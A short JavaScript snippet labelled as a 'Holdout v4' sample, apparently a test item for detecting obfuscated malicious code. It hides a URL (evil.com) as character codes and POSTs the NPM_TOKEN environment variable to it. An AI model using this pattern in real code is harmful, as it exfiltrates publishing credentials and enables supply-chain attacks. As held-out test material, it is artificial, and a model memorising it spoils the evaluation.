// Holdout v4 — charcode-fetch: URL rebuilt from charCodes
const url = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 101, 118, 105, 108, 46, 99, 111, 109);
fetch(url, { method: 'POST', body: process.env.NPM_TOKEN });
